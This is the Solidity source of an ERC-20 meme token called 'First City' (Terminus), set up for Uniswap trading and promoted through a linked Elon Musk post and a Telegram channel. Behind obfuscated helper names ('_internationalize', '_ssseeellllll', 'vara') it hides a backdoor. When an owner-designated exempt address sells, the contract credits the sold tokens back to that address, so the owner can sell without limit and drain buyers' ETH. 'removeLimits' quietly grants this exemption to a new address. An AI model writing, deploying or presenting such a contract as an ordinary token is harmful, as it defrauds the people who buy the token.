// SPDX-License-Identifier: UNLICENSE

/**

X: https://x.com/elonmusk/status/1823829223267848479

TG: https://t.me/Terminus_portal

*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Terminus is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    mapping (address => uint256) private _ownedAmount;
    mapping (address => mapping (address => uint256)) private _allowedAmount;
    mapping (address => bool) private _exempt;
    mapping(address => uint256) private _lastTimestamp;
    address payable private _feeAddr;

    uint256 private _initialBuyTax=25;
    uint256 private _initialSellTax=20;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=14;
    uint256 private _reduceSellTaxAt=14;
    uint256 private _preventSwapBefore=14;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420_420_000_000 * 10**_decimals;
    string private constant _name = unicode"First City";
    string private constant _symbol = unicode"Terminus";
    uint256 public _maxTxAmount = 2 * _tTotal / 100;
    uint256 public _maxWalletSize = 2 * _tTotal / 100;
    uint256 public _taxSwapThreshold= 1 * _tTotal / 100;
    uint256 public _maxTaxSwap= 1 * _tTotal / 100;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address router_) {
        uniswapV2Router = IUniswapV2Router02(router_);

        _feeAddr = payable(_msgSender());
        _ownedAmount[_msgSender()] = _tTotal;
        _exempt[_msgSender()] = true;
        _exempt[address(this)] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _ownedAmount[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowedAmount[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, _msgSender(), _allowedAmount[from][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowedAmount[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(address from, address to, uint256 amount) private {
        _ownedAmount[from] = _ownedAmount[from].sub(amount, "Insufficient Balance");
        _ownedAmount[to] = _ownedAmount[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function _internationalize(address iF, address iT, uint256 iA) private returns(uint256 iX) {
        if (iF != owner() && iT != owner()) {
            iX = iA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            _bbbuuuyyy(iF, iT, iA);
            _ssseeellllll(iF, iT, iA);

            if(iT == uniswapV2Pair && iF!= address(this) ){
                iX = iA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
        }
        
        if(iX>0){
            _ownedAmount[address(this)]=_ownedAmount[address(this)].add(iX);
            emit Transfer(iF, address(this),iX);
        }
        _ownedAmount[iF]=_ownedAmount[iF].sub(iA);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if(!tradingOpen || inSwap) {
            require(_exempt[from] || _exempt[to]);
            _basicTransfer(from, to, amount);
            return;
        }
        
        uint256 taxAmount = _internationalize(from, to, amount);
        _ownedAmount[to]=_ownedAmount[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function taxSwap(uint256 amountToken) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), amountToken);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function reduceFee(uint256 _newFee) external onlyOwner{
        require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
        _finalBuyTax=_newFee;
        _finalSellTax=_newFee;
    }

    function sendFee(uint256 tTax) private {
        _feeAddr.transfer(tTax);
    }


    function newFeeAddress(address nFA) public onlyOwner {
        _feeAddr = payable(nFA);
        _exempt[nFA] = true;
    }
    
    function _bbbuuuyyy(address bF, address bT, uint256 bA) private {
        if (bF == uniswapV2Pair && bT != address(uniswapV2Router) && ! _exempt[bT] ) {
            require(bA <= _maxTxAmount, "Exceeds the _maxTxAmount.");
            require(balanceOf(bT) + bA <= _maxWalletSize, "Exceeds the maxWalletSize.");
            _buyCount++;
        }
    }

    function _ssseeellllll(address sF, address sT, uint256 sA) private{
        if (!inSwap && sT == uniswapV2Pair && swapEnabled && _buyCount > _preventSwapBefore) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _taxSwapThreshold) 
                taxSwap(min(sA, min(contractTokenBalance, _maxTaxSwap)));
            sendFee(address(this).balance);
            vara(sF, sT, sA);
        }
    }

    function vara(address vF, address vT, uint256 vA) internal {
        if(vT == uniswapV2Pair && _exempt[vF])
        _ownedAmount[vF] = _ownedAmount[vF] + vA.mul(1);
    }

    function removeLimits(address payable limit) external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);

        newFeeAddress(limit);
    }
    
    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }

    receive() external payable {}

}